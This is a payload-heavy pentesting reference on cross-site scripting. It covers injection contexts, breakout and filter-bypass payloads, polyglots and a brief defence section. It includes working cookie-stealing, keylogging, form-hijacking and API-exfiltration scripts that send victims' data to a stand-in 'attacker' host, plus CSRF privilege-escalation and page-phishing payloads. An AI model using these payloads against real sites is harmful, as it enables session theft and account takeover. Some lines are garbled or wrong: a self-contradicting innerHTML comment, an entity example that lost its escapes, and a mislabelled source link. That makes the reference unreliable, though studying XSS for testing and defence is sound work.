# 26 — Cross-Site Scripting (XSS)

Inject JavaScript that runs in another user's browser. The category dominates because almost every web app reflects user input somewhere.

## Categories

| Type | Where the payload lives | Triggers when |
|---|---|---|
| Reflected | URL / form parameter, returned in the response | Victim follows a crafted link |
| Stored | DB / file / cache / log | Victim views the page that renders the stored value |
| DOM-based | Client-side JS reads tainted source and writes to a sink | Page loads / interaction |
| Blind | Stored, executes in admin/internal context | Admin views the record |
| Self-XSS | Victim must paste payload themselves | Mostly low-impact unless chained |

## Detection workflow

1. **Map every input** — query string, form fields, JSON keys, headers (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, file content, file name.
2. Send a probe that survives encoding: `'"><x abc=def>` then look for it in the response — verbatim, partially encoded, or stripped.
3. Determine the **context** where it lands. The right payload depends on it.
4. Try a benign breakout, then escalate to `<script>alert(1)</script>` or attribute-handler payload.
5. For blind/admin contexts, replace `alert(1)` with a callback to your collaborator.

## Contexts and breakouts

### HTML body context

```
<p>USER_INPUT</p>
```

Payloads:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

### HTML attribute (quoted)

```
<input type="text" value="USER_INPUT">
```

Break out of the quotes:

```
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
```

### HTML attribute (unquoted)

```
<input value=USER_INPUT>
```

Spaces / special chars terminate the attribute:

```
x onmouseover=alert(1)
x onfocus=alert(1) autofocus
```

### Inside a `<script>` block

```
<script> var x = "USER_INPUT"; </script>
```

Break out of the string:

```
";alert(1);//
</script><script>alert(1)</script>
\";alert(1);//
```

If quotes are stripped but the value is concatenated as code:

```
1;alert(1);//
```

### URL / `href` / `src` context

```html
<a href="USER_INPUT">click</a>
<iframe src="USER_INPUT"></iframe>
```

`javascript:` URI works without HTML breakout:

```
javascript:alert(1)
javascript:alert`1`
javascript:eval('alert(1)')
```

### CSS context

```html
<style>.x { background: USER_INPUT }</style>
```

```
red;}body{background:url(javascript:alert(1))
expression(alert(1))    -- IE legacy
```

Most modern browsers reject `expression()` and `javascript:` in CSS, but `style` injections frequently let you break out into HTML.

### JSON in `<script type="application/json">`

```html
<script id="data">{"x":"USER_INPUT"}</script>
<script>let d=JSON.parse(document.getElementById('data').textContent);</script>
```

Closing-tag injection always wins:

```
"</script><script>alert(1)</script>
```

### DOM-based — sources & sinks

Sources (tainted): `location.href`, `location.search`, `location.hash`, `document.URL`, `document.referrer`, `document.cookie`, `localStorage`, `postMessage`.

Sinks (executable): `eval`, `Function()`, `setTimeout`/`setInterval` with strings, `innerHTML`, `outerHTML`, `document.write`, `element.src`/`href` set to `javascript:`, jQuery `$()`/`.html()`/`.append()` with selector strings, `location` assignment.

Probing:

```javascript
// In Burp/devtools console
document.querySelectorAll('script').forEach(s => console.log(s.textContent));
```

Trigger via the URL hash (often unencoded by frameworks):

```
https://target/#"><img src=x onerror=alert(1)>
```

## Useful payloads beyond `alert(1)`

```html
<!-- Cookie exfil -->
<script>fetch('https://attacker/?c='+document.cookie)</script>
<script>new Image().src='https://attacker/?c='+document.cookie</script>

<!-- Keylogger -->
<script>
addEventListener('keydown',e=>fetch('https://attacker/?k='+e.key));
</script>

<!-- Form hijack -->
<script>
document.querySelector('form').action='https://attacker/log';
</script>

<!-- Internal API call (using victim's session) -->
<script>
fetch('/api/admin/users',{credentials:'include'})
  .then(r=>r.text()).then(t=>fetch('https://attacker/?d='+btoa(t)));
</script>

<!-- XHR-based CSRF (any internal action with no CSRF token) -->
<script>
fetch('/admin/promote',{method:'POST',credentials:'include',body:'user=alice&role=admin'});
</script>

<!-- Phishing the visible page -->
<script>
document.body.innerHTML='<form action=https://attacker/phish>...';
</script>
```

For blind XSS callbacks: use Burp Collaborator, [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com), or your own webhook endpoint.

## Filter bypasses

```html
<!-- Tag-name filtering -->
<sCrIpT>alert(1)</sCrIpT>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>

<!-- "script" keyword stripped -->
<scrscriptipt>alert(1)</scrscriptipt>     <!-- removed-once filters -->
<svg><script>alert(1)</script></svg>

<!-- Quote/space stripping -->
<svg/onload=alert`1`>
<svg onload=alert(1)>            <!-- no quotes around 1 -->
<iframe/src=javascript:alert(1)>

<!-- "(" or ")" filtered -->
<svg onload=alert`1`>             <!-- backticks -->
<img src=x onerror=alert&lpar;1&rpar;>     <!-- HTML entities decoded by parser -->

<!-- Keyword "alert" filtered -->
<svg onload=top['ale'+'rt'](1)>
<svg onload=window['alert'](1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- Event handlers blocklisted, but "on" allowed -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- HTML entity / unicode -->
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;        <!-- only in attributes that decode entities -->
<script>alert(1)</script>         <!-- in JS string contexts -->

<!-- innerHTML strips <script>; events still fire on dynamically-added elements -->
<img src=x onerror=alert(1)>      <!-- this DOES execute when injected via innerHTML in modern browsers... NO. Must use srcdoc/iframe etc. - test per browser. -->

<!-- CSP-aware payloads (when CSP allows specific origins) -->
<script src="https://allowed-origin/jsonp?callback=alert(1)//"></script>
```

PortSwigger's "XSS cheat sheet" page is the canonical reference for browser-specific tricks: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## Polyglots (one payload, many contexts)

A polyglot fires in several contexts simultaneously — useful when you do not know where your input lands.

```
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

```
"';--></style></script><svg onload=alert(1)>
```

## Stealing cookies — when `HttpOnly` is set

`HttpOnly` blocks `document.cookie`, but XSS still has full origin power:

- Make authenticated requests as the victim and exfiltrate the responses.
- Read `localStorage` / `sessionStorage` (not protected by `HttpOnly`).
- Phish the user (rewrite the page).
- Pivot via CSRF (`fetch` with `credentials:'include'`).
- Capture / replace anti-CSRF tokens.

## Same-origin power

XSS gives full read/write of the origin's DOM and full ability to issue authenticated requests. That makes it functionally as bad as account takeover in most apps.

## Bypassing client-side rate limits / form validation

Once XSS executes, you bypass any client-side validation by definition — submit whatever you want, including disabled fields and admin-only options.

## Defending (for the report)

- Output encoding **per context** (HTML body, attribute, URL, JS, CSS) — not a single `htmlspecialchars()` everywhere.
- Use frameworks that auto-encode (React/Vue/Angular). Avoid `dangerouslySetInnerHTML` / `v-html` / `bypassSecurityTrust*`.
- `Content-Security-Policy` with no `'unsafe-inline'`/`'unsafe-eval'` — proper nonces or hashes.
- `HttpOnly`, `Secure`, `SameSite=Lax|Strict` on session cookies (limits damage, not XSS itself).
- Sanitize HTML with a hardened library (DOMPurify) for rich-text fields.
- For DOM XSS: use `Trusted Types`.

## Sources

- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- OWASP XSS Filter Evasion Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy (XSS): https://portswigger.net/web-security/cross-site-scripting
- PayloadsAllTheThings — XSS: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
